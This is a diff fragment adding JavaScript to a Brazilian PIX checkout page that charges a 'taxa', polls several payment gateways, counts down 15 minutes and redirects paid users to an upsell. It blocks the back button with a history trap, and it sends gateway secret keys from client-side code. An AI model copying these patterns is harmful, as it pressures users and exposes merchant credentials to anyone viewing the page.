+          case 'mangofy': res = await fetch(`${API_BASES.mangofy}/api/v1/payment/${txId}`, { headers: { 'Authorization': creds.api_key, 'Store-Code': creds.store_code, 'Accept': 'application/json' } }); break;
+          case 'otimize': { const a = 'Basic ' + btoa_utf8(creds.secret_key + ':x'); res = await fetch(`${API_BASES.otimize}/v1/transactions/${txId}`, { headers: { 'Authorization': a, 'Accept': 'application/json' } }); break; }
+          case 'sigilopay': res = await fetch(`${API_BASES.sigilopay}/gateway/transactions?id=${txId}`, { headers: { 'x-public-key': creds.public_key, 'x-secret-key': creds.secret_key, 'Accept': 'application/json' } }); break;
+          case 'blackcat': res = await fetch(`${API_BASES.blackcat}/sales/${txId}/status`, { headers: { 'X-API-Key': creds.api_key, 'Accept': 'application/json' } }); break;
+          default: return false;
+        }
+        if (!res || !res.ok) return false;
+        const data = await res.json();
+        let s = '';
+        if (gateway === 'ironpay') { const tx = (data?.data || []).find(t => t.hash === txId); s = String(tx?.payment_status || '').toLowerCase(); }
+        else if (gateway === 'unipay') s = String(data?.data?.status || '').toLowerCase();
+        else if (gateway === 'mangofy') s = String(data?.payment_status || data?.data?.payment_status || data?.status || '').toLowerCase();
+        else s = String(data?.status || data?.data?.status || '').toLowerCase();
+        return ['paid', 'approved', 'complete', 'completed'].includes(s);
+      } catch(e) { return false; }
+    }
+
+    // ===== MAIN =====
+    document.addEventListener('DOMContentLoaded', function () {
+      const spinnerEl = document.getElementById('spinner');
+      const qrEl = document.getElementById('qrcode');
+      const pixInputEl = document.getElementById('pixcopiaecola');
+      const minutesEl = document.getElementById('minutes');
+      const secondsEl = document.getElementById('seconds');
+
+      // Timer
+      let tempoRestante = 15 * 60;
+      const timerInterval = setInterval(function() {
+        const m = Math.floor(tempoRestante / 60), s = tempoRestante % 60;
+        if (minutesEl) minutesEl.innerHTML = String(m).padStart(2,'0') + '<span>minutos</span>';
+        if (secondsEl) secondsEl.innerHTML = String(s).padStart(2,'0') + '<span>segundos</span>';
+        if (tempoRestante <= 0) { clearInterval(timerInterval); return; }
+        tempoRestante--;
+      }, 1000);
+
+      function mostrarQR(code, qrUrl) {
+        if (!code && !qrUrl) return;
+        if (qrUrl) {
+          // Gateway já forneceu URL pronta — carrega direto
+          const img = new Image();
+          img.onload = () => {
+            if (qrEl) { qrEl.src = img.src; qrEl.style.display = 'block'; }
+            if (spinnerEl) spinnerEl.style.display = 'none';
+          };
+          img.onerror = () => gerarQRLocal(code);
+          img.src = qrUrl;
+        } else {
+          gerarQRLocal(code);
+        }
+      }
+
+      function gerarQRLocal(code) {
+        if (!code) return;
+        try {
+          // Gera QR localmente via QRCode.js (sem request externo)
+          const frame = document.querySelector('.qr-frame');
+          if (!frame) throw new Error('no frame');
+          if (spinnerEl) spinnerEl.style.display = 'none';
+          if (qrEl) qrEl.style.display = 'none';
+          // Remove QR anterior se houver
+          const old = frame.querySelector('#qr-local');
+          if (old) old.remove();
+          const div = document.createElement('div');
+          div.id = 'qr-local';
+          div.style.cssText = 'width:250px;height:250px;display:flex;align-items:center;justify-content:center;';
+          frame.appendChild(div);
+          new QRCode(div, { text: code, width: 250, height: 250, colorDark: '#000000', colorLight: '#ffffff', correctLevel: QRCode.CorrectLevel.M });
+        } catch(e) {
+          // Fallback externo
+          if (qrEl) {
+            qrEl.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(code)}&size=250x250&qzone=1&format=png&ecc=M`;
+            qrEl.style.display = 'block';
+          }
+          if (spinnerEl) spinnerEl.style.display = 'none';
+        }
+      }
+
+      function getFunilKey() {
+        const params = new URLSearchParams(window.location.search);
+        const cpf = (params.get('cpf') || '').replace(/\D/g,'');
+        const valor = params.get('valor') || '0';
+        return cpf ? 'funil_tx_' + cpf + '_' + valor : 'funil_tx_anonimo_' + valor;
+      }
+
+      function ativarBloqueioRetorno() {
+        history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function() {
+          history.pushState(null, '', window.location.href);
+          document.getElementById('popupBloqueio').classList.add('show');
+        });
+      }
+
+      function redirecionarAprovado(txId, gateway) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const next = urlParams.get('next') || '/upsell/1/';
+        const redirectUrl = new URL(next, window.location.origin);
+        redirectUrl.searchParams.set('funil_ok', '1');
+        const nome = urlParams.get('nome') || '';
+        const cpf = urlParams.get('cpf') || '';
+        if (nome) redirectUrl.searchParams.set('nome', nome);
+        if (cpf) redirectUrl.searchParams.set('cpf', cpf);
+        window.location.href = redirectUrl.toString();
+      }
+
+      let pollingInterval = null;
+      function iniciarPolling(txId, gateway) {
+        if (pollingInterval) clearInterval(pollingInterval);
+        // Botão verificar manual
+        const btnVerificar = document.getElementById('verificar-pagamento');
+        if (btnVerificar) {
+          btnVerificar.addEventListener('click', async () => {
+            const notif = document.getElementById('notificacao-status-pagamento');
+            if (notif) { notif.textContent = 'Verificando...'; notif.className = 'notif notif-blue show'; }
+            const pago = await checkPaymentStatus(txId, gateway);
+            if (pago) { clearInterval(pollingInterval); redirecionarAprovado(txId, gateway); }
+            else if (notif) { notif.textContent = 'Pagamento ainda não confirmado.'; notif.className = 'notif notif-red show'; setTimeout(() => notif.classList.remove('show'), 3000); }
+          });
+        }
+        pollingInterval = setInterval(async () => {
+          if (window._paymentApproved) return;
+          const pago = await checkPaymentStatus(txId, gateway);
+          if (pago) { window._paymentApproved = true; clearInterval(pollingInterval); redirecionarAprovado(txId, gateway); }
+        }, 7000);
+      }
+
+      async function iniciarPagamento() {
+        if (window._pagamentoIniciado) return;
+        window._pagamentoIniciado = true;
+
+        // Recuperar TX existente do localStorage
+        const funilKey = getFunilKey();
+        const existente = localStorage.getItem(funilKey);
+        if (existente) {
+          try {
+            const entry = JSON.parse(existente);
+            if (entry.txId && entry.pixCode && entry.gateway) {
+              if (pixInputEl) pixInputEl.value = entry.pixCode;
+              const pixActionsRestore = document.getElementById('pix-actions');
+              if (pixActionsRestore) pixActionsRestore.style.display = 'block';
+              const pixInfoRestore = document.getElementById('pix-info');
+              if (pixInfoRestore) pixInfoRestore.style.display = 'block';
+              const restoreValorUrl = new URLSearchParams(window.location.search).get('valor');
+              if (restoreValorUrl) {
+                const restoreValorFormatado = (parseInt(restoreValorUrl, 10) / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                const restoreValorBadge = document.getElementById('valor-badge');
+                if (restoreValorBadge) restoreValorBadge.textContent = 'Valor da Taxa: R$ ' + restoreValorFormatado;
+              }
+              const cardInstrucoesRestore = document.getElementById('card-instrucoes');
+              if (cardInstrucoesRestore) cardInstrucoesRestore.style.display = 'block';
+              mostrarQR(entry.pixCode);
+              ativarBloqueioRetorno();
+              iniciarPolling(entry.txId, entry.gateway);
+              return;
+            }
+          } catch(e) {}
+        }
+
+        if (spinnerEl) spinnerEl.style.display = 'flex';
+        if (qrEl) qrEl.style.display = 'none';
+
+        // Dados do cliente
+        const urlParams = new URLSearchParams(window.location.search);
+        const config = typeof GLOBAL_CONFIG !== 'undefined' ? GLOBAL_CONFIG : null;
+        const valorUrl = urlParams.get('valor');
+        const amountCents = valorUrl ? parseInt(valorUrl, 10) : Math.round(parseFloat((config?.product?.amount || '78,47').replace(',','.')) * 100);
+        const valorFormatado = (amountCents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        const valorBadgeEl = document.getElementById('valor-badge');
+        if (valorBadgeEl) valorBadgeEl.textContent = 'Valor da Taxa: R$ ' + valorFormatado;
+
+        const customerData = {
+          name: decodeURIComponent(urlParams.get('nome') || localStorage.getItem('userName') || 'Cliente'),
+          email: decodeURIComponent(urlParams.get('email') || 'cliente@email.com'),
+          phone: (urlParams.get('telefone') || '11912345678').replace(/\D/g,''),
+          cpf: (urlParams.get('cpf') || localStorage.getItem('userCPF') || '').replace(/\D/g,'')
+        };
+
+        // Previne criação duplicada: se já existe uma tentativa em andamento no localStorage, aguarda
+        const lockKey = funilKey + '_lock';
+        if (localStorage.getItem(lockKey)) {
+          // Outra aba/tentativa está criando - aguarda brevemente e verifica novamente
+          await new Promise(r => setTimeout(r, 2000));
+          const novaEntrada = localStorage.getItem(funilKey);
+          if (novaEntrada) {
+            try {
+              const entry = JSON.parse(novaEntrada);
+              if (entry.txId && entry.pixCode && entry.gateway) {
+                if (pixInputEl) pixInputEl.value = entry.pixCode;
+                mostrarQR(entry.pixCode);
+                ativarBloqueioRetorno();
+                iniciarPolling(entry.txId, entry.gateway);
+                return;
+              }
+            } catch(e) {}
+          }
+        }
+        localStorage.setItem(lockKey, '1');
+
+        let lastErr = null;
+        for (let attempt = 1; attempt <= 3; attempt++) {
+          try {
+            const result = await gerarPixGateway(customerData, amountCents);
+            const txId = extractTransactionId(result.raw, result.gateway);
+
+            localStorage.setItem(funilKey, JSON.stringify({ txId, pixCode: result.pixCopyPaste, gateway: result.gateway, ts: Date.now() }));
+            localStorage.removeItem(lockKey);
+
+            if (pixInputEl) pixInputEl.value = result.pixCopyPaste || '';
+            const pixActions = document.getElementById('pix-actions');
+            if (pixActions) pixActions.style.display = 'block';
+            const pixInfo = document.getElementById('pix-info');
+            if (pixInfo) pixInfo.style.display = 'block';
+            const cardInstrucoes = document.getElementById('card-instrucoes');
+            if (cardInstrucoes) cardInstrucoes.style.display = 'block';
+            mostrarQR(result.pixCopyPaste, result.qrCodeUrl);
+            ativarBloqueioRetorno();
+            if (txId) iniciarPolling(txId, result.gateway);
+            return;
+          } catch(err) {
+            lastErr = err;
+            console.error(`[PIX] Tentativa ${attempt} falhou:`, err);
+            if (attempt < 3) await new Promise(r => setTimeout(r, attempt * 1500));
+          }
+        }
+        localStorage.removeItem(lockKey);
+        if (spinnerEl) spinnerEl.textContent = 'Erro ao gerar pagamento. Recarregue a página.';
+        console.error('[PIX] Todas tentativas falharam:', lastErr);
+      }
+
+      iniciarPagamento();
+    });
+  </script>
+
+
+</body></html>
